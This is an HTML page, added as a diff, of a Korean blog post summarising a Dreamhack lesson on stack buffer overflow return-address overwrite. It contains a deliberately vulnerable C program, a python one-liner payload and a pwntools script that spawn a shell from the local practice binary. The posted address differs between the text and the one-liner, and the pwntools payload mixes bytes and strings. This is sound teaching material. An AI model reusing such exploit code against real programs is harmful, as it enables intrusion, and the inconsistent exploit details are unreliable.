@@ -1,0 +1,1319 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/blog/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/blog/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/blog/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="dreamhack,pwnable,return to overwrite," />
+
+
+
+
+
+  <link rel="alternate" href="/blog/atom.xml" title="M0kI's bloG" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/blog/assets/profile.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="해당 포스팅은 드림핵의 강의를 정리한 글이다. Return to Overwrite는 스택 버퍼 오버플로우를 이용해서 return 자리의 주소를 내가 원하는 주소로 바꾸는 것이다. 따라서 스택에서 어느 위치에 버퍼가 위치해 있고, 얼마만큼을 overwrite해야 하는지를 잘 따져 주어야 한다. 해당 이미지는 드림핵에 있는 그림을 가져온 것이다. 내가 함수 호출 규약을 설명한 글을 보면 제대로 알 수 있다.">
+<meta name="keywords" content="dreamhack, pwnable, return to overwrite">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[pwnable] Return To Overwrite">
+<meta property="og:url" content="http://localhost:4000/blog/return-to-overwrite/">
+<meta property="og:site_name" content="M0kI's bloG">
+<meta property="og:description" content="해당 포스팅은 드림핵의 강의를 정리한 글이다. Return to Overwrite는 스택 버퍼 오버플로우를 이용해서 return 자리의 주소를 내가 원하는 주소로 바꾸는 것이다. 따라서 스택에서 어느 위치에 버퍼가 위치해 있고, 얼마만큼을 overwrite해야 하는지를 잘 따져 주어야 한다. 해당 이미지는 드림핵에 있는 그림을 가져온 것이다. 내가 함수 호출 규약을 설명한 글을 보면 제대로 알 수 있다.">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://kr.object.ncloudstorage.com/dreamhack-content/page/ba14b1d45d74d46ab7f84d20ec60a4806f9d42bb29d2fb6f434cf152d9b0a76c.png">
+<meta property="og:image" content="https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_gdb_main.png?raw=true">
+<meta property="og:image" content="https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_get_shell.png?raw=true">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[pwnable] Return To Overwrite">
+<meta name="twitter:description" content="해당 포스팅은 드림핵의 강의를 정리한 글이다. Return to Overwrite는 스택 버퍼 오버플로우를 이용해서 return 자리의 주소를 내가 원하는 주소로 바꾸는 것이다. 따라서 스택에서 어느 위치에 버퍼가 위치해 있고, 얼마만큼을 overwrite해야 하는지를 잘 따져 주어야 한다. 해당 이미지는 드림핵에 있는 그림을 가져온 것이다. 내가 함수 호출 규약을 설명한 글을 보면 제대로 알 수 있다.">
+<meta name="twitter:image" content="https://kr.object.ncloudstorage.com/dreamhack-content/page/ba14b1d45d74d46ab7f84d20ec60a4806f9d42bb29d2fb6f434cf152d9b0a76c.png">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/blog',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/blog"/>
+
+
+
+
+
+  <title>[pwnable] Return To Overwrite | M0kI's bloG</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-298875661', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/blog/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0kI's bloG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">뭐가 올라올지 저도 몰라요</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog/blog/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/blog/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/blog/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/blog/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/blog/return-to-overwrite/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mok">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="assets/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0kI's bloG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            [pwnable] Return To Overwrite
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-08T09:00:00+09:00">
+                2022-02-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/category/#/pwnable" itemprop="url" rel="index">
+                    <span itemprop="name">pwnable</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <p><strong>해당 포스팅은 드림핵의 강의를 정리한 글이다.</strong> Return to Overwrite는 스택 버퍼 오버플로우를 이용해서 return 자리의 주소를 내가 원하는 주소로 바꾸는 것이다. 따라서 스택에서 어느 위치에 버퍼가 위치해 있고, 얼마만큼을 overwrite해야 하는지를 잘 따져 주어야 한다. 해당 이미지는 <a href="https://dreamhack.io/learn/58#7">드림핵</a>에 있는 그림을 가져온 것이다. 내가 함수 호출 규약을 설명한 <a href="https://mok0102.github.io/호출-규약/">글</a>을 보면 제대로 알 수 있다.</p>
+
+<p><img src="https://kr.object.ncloudstorage.com/dreamhack-content/page/ba14b1d45d74d46ab7f84d20ec60a4806f9d42bb29d2fb6f434cf152d9b0a76c.png" alt="이미지" /></p>
+
+<h2 id="스택-구조">스택 구조</h2>
+<p>함수 스택이 새로 생성되면, 함수 파라미터들이  제일 주소가 큰 쪽(아래쪽)에 쌓이고, 그 다음에 돌아가기 위한 ret주소가 실리고, 그 위에 이전 스택 프레임의 시작 지점(sfp)가 실린다. 그 위에 이제 buf처럼 해당하는 변수들이 쌓이게 된다. 따라서 스택은 위로(주소가 큰 쪽에서 작은 쪽으로) 자란다. 그러나 우리가 buf에 값을 쓰는 건 위에서 아래로 써진다.(주소가 작은 쪽에서 큰 쪽으로) 결국 우리가 buf에서 값을 쓰기 시작하면 그 밑에 있는 sfp, ret에까지 침범할 수 있게 된다는 것이다. 이게 stack buffer overflow이고, 특별히 이 ret부분에 내가 실행하고자 하는 함수의 주소를 넣는 것이 return to overwrite이다.</p>
+
+<h2 id="문제">문제</h2>
+<p>우리는 다음 c 코드에서 쉘을 따는 익스플로잇을 Return to Overwrite를 통해 구현할 것이다. 아무런 보호 기법을 아직 적용하지 않고 문제를 풀 것이기 때문에 gcc 옵션으로 -fno-stack-protector와 -no-pie를 준다.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20</pre></td><td class="code"><pre class="highlight"><code><span class="c1">// Name: rao.c</span>
+<span class="c1">// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+</span><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+  <span class="n">execve</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x28</span><span class="p">];</span>
+  <span class="n">init</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input: "</span><span class="p">);</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="문제-풀이">문제 풀이</h2>
+<h4 id="1-밀어야-할-크기-구하기">1. 밀어야 할 크기 구하기</h4>
+<p>위 그림의 스택 구조에서, buf와 sfp를 모두 A와 같은 아무 문자열로 밀어 버리고 ret에 get_shell의 구조를 넣으면 쉘을 딸 수 있다. 따라서 가장 먼저 해야 하는 것은 buf와 sfp가 얼마나의 공간을 차지하고 있는가이다. 그걸 알아야 몇개의 A로 buf와 sfp를 깔끔하게 밀 수 있는지를 알 수 있을 테니까. 가장먼저, 64비트 체계이기 때문에 스택 한 칸의 크기는 0x8이다. 만약 32비트라면 0x4가 된다. 따라서 buf는 찾아봐야겠지만, sfp는 0x8만큼 차지하고 있다고 알 수 있다. 
+이제, buf가 얼마나 공간을 차지하는지를 찾아볼 것이다. buf가 0x28만큼 공간을 차지하고 있다고 생각하고 buf 0x28, sfp 0x8해서 0x28+0x8만큼 민다고 생각할 수 있는데, 내가 느끼기로는 c코드만 보고서는 buf의 크기를 정확하게 알 수 없다. 0x28일 때도 있고, alignment라고 해서 8의 배수를 맞추기 위해? 조금 더 커질 때도 있다. 근데 내 경험상 8의 배수랑도 상관이 잘 없는 거 같고, 그냥 gdb로 buf의 크기가 얼마만큼 할당됬는지를 보는 게 제일 마음 편하다. 
+<img src="https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_gdb_main.png?raw=true" alt="이미지" width="500" height="500" />
+밑의 그림을 보면, push rbp(이 Push된 자리에 sfp가 들어간다) 이후 sub rsp, 0x30을 하는데, 지금 rsp가 sfp자리를 가리키고 있는 상태에서 rsp가 위로 0x30만큼 올라갔으므로, buf의 크기가 0x30임을 알 수 있다. 
+<strong>결국 buf의 크기: 0x30, sfp의 크기: 0x8이므로 우리가 ret까지 가려면 총 0x38만큼을 아무 문자로 밀어주면 된다.</strong></p>
+
+<h4 id="2-ret자리에-들어가야-할-것-구하기">2. ret자리에 들어가야 할 것 구하기</h4>
+<p>지금 함수 중에 get_shell이라는 함수를 만들어 줬기 때문에, 굳이 막 라이브러리의 shell함수를 실행하지 않고 그냥 이 파일 자체의 get_shell함수의 주소를 ret자리에 넣어 주면 프로그램이 이게 return 주소인줄 착각하고 get_shell을 실행시킨다. 그럼 get_shell의 주소는 어떻게 구하면 될까? 모든 보호기법이 해제되어 있기 때문에, 프로그램을 실행할 때마다 get_shell의 주소가 바뀌는 복잡한 상황은 생기지 않는다. 따라서 get_shell의 주소를 다이나믹하게 구할 필요가 없고 그냥 상수처럼 한번 딱 찾아서 계속 그걸 쓰면 된다. 그럼 get_shell의 주소는 어떻게 찾을까? 여러가지 방법이 있다. 나는 gdb에 info func을 쳐서 나오는 모든 함수들의 주소 중에 get_shell을 찾아서 사용했는데, 단순히 그냥 print get_shell을 gdb에 입력하면 그 함수에 대한 정보를 주면서 주소도 같이 준다. 어떤 방법을 사용하던 상관 없다! 밑에서 구한 주소는 0x4006aa였다.</p>
+
+<p><img src="https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_get_shell.png?raw=true" alt="이미지" /></p>
+
+<h4 id="3-익스플로잇-작성">3. 익스플로잇 작성</h4>
+<h6 id="1-커멘드">1) 커멘드</h6>
+<p>커멘드로 바로 보낼 수도 있는데, 여기서 주의해야 할 점은 실행파일이 64비트 little endian이므로 get_shell의 주소를 Little endian으로 바꿔서 보내야 한다는 것이다. 파이썬에 -c 옵션을 주어서 파이썬 실행 결과를 rao파일을 실행하면서 보낸다. 외워 두면 그래도 어느 정도 좋을 것 같다.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"print 'A'*0x30 + 'A'*0x8 + '</span><span class="se">\xa7\x05\x40\x00\x00\x00\x00\x00</span><span class="s">'"</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span><span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">rao</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<h6 id="2-pwntools">2) pwntools</h6>
+<p>1번 방법을 나는 잘 몰라서 pwntools로 작성했다. rao 실행파일과 연결 후, input을 받기 전까지(Input: 이 터미널에 띄워 질때까지) 기다린다. 이후 페이로드로 0x38만큼 밀고, p64를 써서 get_shell의 주소를 little endian으로 보낸다. p64이므로 64비트로 패킹해준다. p32는 little endian으로 32비트로 패킹해준다. 이렇게 보내고 나면 익스플로잇이 완료되었으므로, 쉘과 인터렉티브하게 주고받기 위해 p.interactive()를 보낸다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11</pre></td><td class="code"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./rao"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input: "</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006aa</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/blog/tag/#/dreamhack" rel="tag"># dreamhack</a>
+          
+            
+            <a href="/blog/tag/#/pwnable" rel="tag"># pwnable</a>
+          
+            
+            <a href="/blog/tag/#/return%20to%20overwrite" rel="tag"># return to overwrite</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/canary/" rel="next" title="[pwnable] Canary">
+                <i class="fa fa-chevron-left"></i> [pwnable] Canary
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/3273-%EB%91%90-%EC%88%98%EC%9D%98-%ED%95%A9/" rel="prev" title="[백준] 3273 두 수의 합">
+                [백준] 3273 두 수의 합 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/blog/assets/images/avatar.gif"
+               alt="Mok" />
+          <p class="site-author-name" itemprop="name">Mok</p>
+           
+              <p class="site-description motion-element" itemprop="description">My blog</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/blog/archives/">
+                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/blog/categories/">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/blog/tags/">
+                <span class="site-state-item-count">55</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+          <div class="feed-link motion-element">
+            <a href="/blog/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-2"> <a class="nav-link" href="#스택-구조"> <span class="nav-number">1</span> <span class="nav-text">스택 구조</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#문제"> <span class="nav-number">2</span> <span class="nav-text">문제</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#문제-풀이"> <span class="nav-number">3</span> <span class="nav-text">문제 풀이</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#1-밀어야-할-크기-구하기"> <span class="nav-number">3.1</span> <span class="nav-text">1. 밀어야 할 크기 구하기</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#2-ret자리에-들어가야-할-것-구하기"> <span class="nav-number">3.2</span> <span class="nav-text">2. ret자리에 들어가야 할 것 구하기</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#3-익스플로잇-작성"> <span class="nav-number">3.3</span> <span class="nav-text">3. 익스플로잇 작성</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-6"> <a class="nav-link" href="#1-커멘드"> <span class="nav-number">3.3.1</span> <span class="nav-text">1) 커멘드</span> </a> </li> <li class="nav-item nav-level-6"> <a class="nav-link" href="#2-pwntools"> <span class="nav-number">3.3.2</span> <span class="nav-text">2) pwntools</span> </a> </li> </ol> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mok</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://jekyllrb.com">Jekyll</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/blog/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/blog/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/blog/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/blog/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/blog/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
